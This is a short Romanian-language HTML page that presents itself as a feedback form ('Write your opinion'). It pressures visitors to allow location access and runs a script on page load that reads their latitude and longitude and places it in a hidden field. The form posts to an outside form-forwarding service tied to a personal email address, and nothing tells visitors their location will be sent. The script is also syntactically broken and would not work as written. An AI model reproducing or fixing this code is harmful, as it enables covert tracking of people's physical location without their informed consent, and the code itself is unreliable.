<!DOCTYPE html>
<html>
  <head>
    <title>Scrie parerea ta</title>
  </head>
  <body>
    <p>ACCEPTA FOLOSIREA LOCATIEI NUMAIDECAT</p>
    <form action="https://formsubmit.co/ursuarsenie7@gmail.com" method="POST" />
    <textarea name="message" id="message" rows="5" placeholder="Parerea ta conteaza"></textarea>
    <input type="hidden" id="locatie" name="_subject" value="placeholder">
    <button type="submit">Send</button>

    
    <script>
      document.addEventListener('DOMContentLoaded', function(){
        if (navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(position) {
    
    document.getElementById('locatie').dataset.value = "latitude: " + position.coords.latitude + "<br>longitude: " + position.coords.longitude";
    console.log("latitude: " + position.coords.latitude + "<br>longitude: " + position.coords.longitude"); 
  });
}
      });
    </script>
  </body>
</html>
